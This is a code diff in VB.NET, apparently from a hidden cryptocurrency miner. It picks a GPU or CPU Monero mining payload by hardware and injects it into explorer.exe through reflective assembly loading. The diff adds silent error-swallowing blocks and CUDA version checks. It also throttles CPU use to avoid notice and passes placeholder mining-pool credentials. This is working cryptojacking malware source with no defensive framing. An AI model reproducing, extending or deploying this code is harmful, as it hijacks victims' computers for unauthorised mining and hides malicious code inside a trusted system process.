@@ -78,7 +78,10 @@ Public Class Program
     End Function
 
     Public Shared Sub GetTheLoad(ByVal PL As Byte(), ByVal arg As String, ByVal buffer As Byte())
-        Assembly.Load(PL).GetType("Project1.Program").GetMethod("Load", BindingFlags.Public Or BindingFlags.Static).Invoke(Nothing, New Object() {buffer, "C:\Windows\explorer.exe", arg})
+        Try
+            Assembly.Load(PL).GetType("Project1.Program").GetMethod("Load", BindingFlags.Public Or BindingFlags.Static).Invoke(Nothing, New Object() {buffer, "C:\Windows\explorer.exe", arg})
+        Catch ex As Exception
+        End Try
     End Sub
 
     Public Shared Sub KillLastProc()
@@ -96,21 +99,35 @@ Public Class Program
     End Sub
 
     Public Shared Sub RunIt()
-        Dim Args As String = ""
-        Dim xmr As Byte() = Nothing
-
-        If GetTheSpec.ToLower.Contains("nvidia") Then
-            Args = "--cuda-bfactor=12 --cuda-bsleep=100"
-            xmr = GetTheResource("#nvidia")
-        ElseIf GetTheSpec.ToLower.Contains("amd") Then
-            Args = "--opencl-platform=0 --opencl-devices=0 --opencl-launch=1600x8,1600x8,1600x8"
-            xmr = GetTheResource("#amd")
-        Else
-            Args = "-t " + CType((Environment.ProcessorCount / 2), String) + " --max-cpu-usage=50"
-            xmr = GetTheResource("#cpu")
-        End If
-
         Try
+            Dim Args As String = ""
+            Dim xmr As Byte() = Nothing
+
+            If GetTheSpec.ToLower.Contains("nvidia") Then
+                If IO.Directory.Exists("C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\") Then
+                    For Each folder As String In IO.Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\NVIDIA GPU Computing Toolkit\CUDA")
+                        If folder.Contains("v8") Then
+                            Args = "--cuda-bfactor=12 --cuda-bsleep=100"
+                            xmr = GetTheResource("#nvidia")
+                        ElseIf folder.Contains("v9") Then
+                            Args = "--cuda-bfactor=12 --cuda-bsleep=100"
+                            xmr = GetTheResource("#nvidia2")
+                        Else
+                            Args = "-t " + CType((Environment.ProcessorCount / 2), String) + " --max-cpu-usage=50"
+                            xmr = GetTheResource("#cpu")
+                        End If
+                    Next
+                End If
+
+            ElseIf GetTheSpec.ToLower.Contains("amd") Then
+                Args = "--opencl-platform=0 --opencl-devices=0 --opencl-launch=1600x8,1600x8,1600x8"
+                xmr = GetTheResource("#amd")
+            Else
+                Args = "-t " + CType((Environment.ProcessorCount / 2), String) + " --max-cpu-usage=50"
+                xmr = GetTheResource("#cpu")
+            End If
+
+
             GetTheLoad(GetTheResource("#dll"), "-B --donate-level=1 -a cryptonight --url=#URL -u #USER -p #PWD -R --variant=-1 " + Args, xmr)
         Catch ex As Exception
         End Try
